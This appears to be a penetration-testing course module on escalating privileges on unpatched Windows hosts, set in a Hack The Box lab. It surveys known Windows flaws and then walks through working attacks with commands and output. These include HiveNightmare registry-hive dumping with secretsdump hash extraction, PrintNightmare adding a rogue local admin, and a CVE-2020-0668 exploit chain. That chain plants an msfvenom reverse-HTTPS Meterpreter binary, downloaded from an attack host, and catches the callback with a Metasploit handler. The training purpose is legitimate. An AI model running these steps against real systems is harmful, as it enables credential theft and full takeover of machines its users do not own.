It's a big challenge to ensure that all user desktops and servers are updated, and 100% compliance for all computers with security patches is likely not an achievable goal. Assuming a computer has been targeted for installation of updates, for example, using SCCM (Microsoft System Center Configuration Manager) or WSUS (Windows Server Update Services), there are still many reasons they could fail to install. Over the years, there have been many kernel exploits that affect the Windows operating system from Windows 2000/XP up to Windows 10/Server 2016/2019. [Here](https://academy.hackthebox.com/module/67/section/627) can be found a detailed table of known remote code execution/local privilege escalation exploits for Windows operating systems, broken down by service pack level, from Windows XP onward to Server 2016.

Note: This table is not 100% complete, and does not go past 2017. As of today, there are more known vulnerabilities for the newer operating system versions and even Server 2019.

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has 4,733 security vulnerabilities entered at the time of writing, showing the massive attack surface that a Windows environment presents.

As we can see from this table, there are many exploits that work for Windows XP up through Server 2012R2. As we get to Windows 10 and Server 2016, there are fewer known exploits. This is partly due to changes to the operating system over time, including security improvements and deprecation of older versions of protocols such as SMB. One important thing to note from this table is that when new vulnerabilities are discovered or exploits released (such as MS17-010), these usually trickle down and affect prior operating system versions. This is why it is vital to stay on top of patching or upgrading, retiring, or segregating off Windows systems that have reached end of life. We will explore this in more depth later on in this module.

It is important to note that while some of the examples above `are` remote code execution vulnerabilities, we can just as easily use them to escalate privileges. One example is if we gain access to a system and notice a port such as 445 (SMB service) not accessible from the outside, we may be able to privilege escalate if it is vulnerable to something such as EternalBlue (MS17-010). In this case, we could either port forward the port in question to be accessible from our attack host or run the exploit in question locally to escalate privileges.

## More Vulnerabilities

Over the years, there have been many high-impact Windows vulnerabilities that can be leveraged to escalate privileges, some being purely local privilege escalation vectors and others being remote code execution (RCE) flaws that can be used to escalate privileges by forwarding a local port. Below are some extremely high-impact Windows vulnerabilities over the years that can be leveraged to escalate privileges.

`MS08-067` - This was a remote code execution vulnerability in the "Server" service due to improper handling of RPC requests. This affected Windows Server 2000, 2003, and 2008 and Windows XP and Vista and allows an unauthenticated attacker to execute arbitrary code with SYSTEM privileges. Though typically encountered in client environments as a remote code execution vulnerability, we may land on a host where the SMB service is blocked via the firewall. We can use this to escalate privileges after forwarding port 445 back to our attack box. Though this is a "legacy" vulnerability, I still do see this pop up from time to time in large organizations, especially those in the medical industry who may be running specific applications that only work on older versions of Windows Server/Desktop. We should not discount older vulnerabilities even in 2021. We will run into every scenario under the sun while performing client assessments and must be ready to account for all possibilities. The box [Legacy](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html) on the Hack The Box platform showcases this vulnerability from the remote code execution standpoint. There are standalone as well as a Metasploit version of this exploit.

`MS17-010` - Also known as [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers) leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account. As with MS08-067, this vulnerability can also be leveraged as a local privilege escalation vector if we land on a host where port 445 is firewalled off. There are various versions of this exploit for the Metasploit Framework as well as standalone exploit scripts. This attack was showcased in the [Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html) box on Hack The Box, again from the remote standpoint.

`ALPC Task Scheduler 0-Day` - The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to `.job` files located in the `C:\Windows\tasks` directory. An attacker could leverage this to create a hard link to a file that the attacker controls. The exploit for this flaw used the [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN) API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\SYSTEM via the Spooler service. An in-depth writeup is available [here](https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html). The Hack The Box box [Hackback](https://snowscan.io/htb-writeup-hackback/) can be used to try out this privilege escalation exploit.

Summer of 2021 revealed a treasure trove of new Windows and Active Directory-related remote code execution and local privilege escalation flaws to the delight of penetration testers (and real-world attackers), and I'm sure groans from our hard-working colleagues on the defense side of things.

`CVE-2021-36934 HiveNightmare, aka SeriousSam` is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Researchers quickly developed a PoC exploit to allow reading of the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin) using a tool such as SecretsDump.py. More information about this flaw can be found [here](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) and [this](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe) exploit binary can be used to create copies of the three files to our working directory. This [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) can be used to detect the flaw and also fix the ACL issue. Let's take a look.

### Checking Permissions on the SAM File

We can check for this vulnerability using `icacls` to check permissions on the SAM file. In our case, we have a vulnerable version as the file is readable by the `BUILTIN\Users` group.
```cmd-session
C:\htb> icacls c:\Windows\System32\config\SAM

C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have `System Protection` enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.

### Performing Attack and Parsing Password Hashes

This [PoC](https://github.com/GossiTheDog/HiveNightmare) can be used to perform the attack, creating copies of the aforementioned registry hives:
```powershell-session
PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe

HiveNightmare v0.6 - dump registry hives as non-admin users

Specify maximum number of shadows to inspect with parameter if wanted, default is 15.

Running...

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

Success: SAM hive from 2021-08-07 written out to current working directory as SAM-2021-08-07

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY

Success: SECURITY hive from 2021-08-07 written out to current working directory as SECURITY-2021-08-07

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM

Success: SYSTEM hive from 2021-08-07 written out to current working directory as SYSTEM-2021-08-07


Assuming no errors above, you should be able to find hive dump files in current working directory.
```

These copies can then be transferred back to the attack host, where impacket-secretsdump is used to extract the hashes:
```shell-session
$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local

```

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` is a flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege `SeLoadDriverPrivilege` the ability to add drivers to a remote Print Spooler. This right is typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user's machine remotely. The flaw allowed any authenticated user to add a print driver to a Windows system without having the privilege mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system. The flaw affects every supported version of Windows, and being that the Print Spooler runs by default on Domain Controllers, Windows 7 and 10, and is often enabled on Windows servers, this presents a massive attack surface, hence "nightmare." Microsoft initially released a patch that did not fix the issue (and early guidance was to disable the Spooler service, which is not practical for many organizations) but released a second [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) in July of 2021 along with guidance to check that specific registry settings are either set to `0` or not defined. Once this vulnerability was made public, PoC exploits were released rather quickly. [This](https://github.com/cube0x0/CVE-2021-1675) version by [@cube0x0](https://twitter.com/cube0x0) can be used to execute a malicious DLL remotely or locally using a modified version of Impacket. The repo also contains a C# implementation. This [PowerShell implementation](https://github.com/calebstewart/CVE-2021-1675) can be used for quick local privilege escalation. By default, this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.

### Checking the Spooler Service

We can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a "path does not exist" error.
```powershell-session
PS C:\htb> ls \\localhost\pipe\spoolss


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```

### Adding Local Admin with PrintNightmare PowerShell PoC

First start by [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host:
```powershell-session
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

Now we can import the PowerShell script and use it to add a new local admin user.
```powershell-session
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```

### Confirming New Admin User

Adding a user is "noisy," We would not want to do this on an engagement where stealth is a consideration. Furthermore, we would want to check with our client to ensure account creation is in scope for the assessment.
```powershell-session
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?8/?9/?2021 12:12:01 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

It is also important to be able to detect and leverage lesser-known flaws.

## Enumerating Missing Pathces

The first step is looking at installed updates and attempting to find updates that may have been missed, thus, opening up an attack path for us.

### Examining Installed Updates

We can examine the installed updates in several ways. Below are three separate commands we can use.
```powershell-session
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```

### Viewing Installed Updates with WMI
```cmd-session
C:\htb> wmic qfe list brief

Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
Update                        KB4601056               NT AUTHORITY\SYSTEM  3/27/2021                                    
Update                        KB4513661                                    1/9/2020                                     
Security Update               KB4516115                                    1/9/2020                                     
Update                        KB4517245                                    1/9/2020                                     
Security Update               KB4528759                                    1/9/2020                                     
Security Update               KB4535680               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB4580325               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB5000908               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB5000808               NT AUTHORITY\SYSTEM  3/27/2021   
```

We can search for each KB (Microsoft Knowledge Base ID number) in the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for `KB5000808` shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.

## CVE-2020-0668 Example

Next, let's exploit [Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a `.OLD` extension when the service is triggered. This move operation is performed by `NT AUTHORITY\SYSTEM`, and can be abused to move a file of our choosing with the help of mount points and symbolic links.

### Checking Current User Privileges
```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### After Building Solution

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.
```shell-session
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```

At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.

- `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

### Checking Permissions on Binary

`icacls` confirms that we only have read and execute permissions on this binary based on the line `BUILTIN\Users:(I)(RX)` in the command output.
```cmd-session
C:\htb> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
 
Successfully processed 1 files; Failed processing 0 files
```

### Generating Malicious Binary
```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 645 bytes
Final size of exe file: 7168 bytes
```

### Hosting the Malicious Binary

We can download it to the target using cURL after starting a Python HTTP server on our attack host like in the `User Account Control` section previously. We can also use wget from the target.
```shell-session
$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.43.13 - - [01/Mar/2022 18:17:26] "GET /maintenanceservice.exe HTTP/1.1" 200 -
10.129.43.13 - - [01/Mar/2022 18:17:45] "GET /maintenanceservice.exe HTTP/1.1" 200 -
```

### Downloading the Malicious Binary

For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.

We need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\Users\htb-student\Desktop` that we are targeting) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` which we will need to account for later. If we attempt to utilize the copied version, we will receive a `system error 216` because the .exe file is no longer a valid binary.
```powershell-session
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

### Running the Exploit

Next, let's run the exploit. It accepts two arguments, the source and destination files.
```cmd-session
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                       

[+] Moving C:\Users\htb-student\Desktop\maintenanceservice.exe to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

[+] Mounting \RPC Control onto C:\Users\htb-student\AppData\Local\Temp\nzrghuxz.leo
[+] Creating symbol links
[+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.
[+] Sleeping for 5 seconds so the changes take effect
[+] Writing phonebook file to C:\Users\htb-student\AppData\Local\Temp\179739c5-5060-4088-a3e7-57c7e83a0828.pbk
[+] Cleaning up
[+] Done!
```

### Checking Permissions of New File

The exploit runs and executing `icacls` again shows the following entry for our user: `WINLPE-WS02\htb-student:(F)`. This means that our htb-student user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.
```cmd-session
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(F)
                                                                          BUILTIN\Administrators:(F)
                                                                          WINLPE-WS02\htb-student:(F)
```

### Replacing File with Malicious Binary
```cmd-session
C:\htb> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

        1 file(s) copied.
```

### Metasploit Resource Script

Next, save the below commands to a [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) file named `handler.rc`.
```shell-session
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

### Launching Metasploit with Resource Script
```shell-session
$ sudo msfconsole -r handler.rc

Metasploit tip: Use the resource command to run commands from a file

[*] Processing handler.rc for ERB directives.
resource (handler.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (handler.rc)> set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
resource (handler.rc)> set LHOST 10.10.14.3
LHOST => 10.10.14.3
resource (handler.rc)> set LPORT 8443
LPORT => 8443

[*] Started HTTPS reverse handler on https://10.10.14.3:8443
```

### Starting the Service
```cmd-session
C:\htb> net start MozillaMaintenance 

The service is not responding to the control function

More help is available by typing NET HELPMSG 2186
```

### Receiving a Meterpreter Session

We will get an error trying to start the service but will still receive a callback once the Meterpreter binary executes.
```shell-session
[*] Started HTTPS reverse handler on https://10.10.14.3:8443
[*] https://10.10.14.3:8443 handling request from 10.129.43.13; (UUID: syyuxztc) Staging x64 payload (201308 bytes) ...
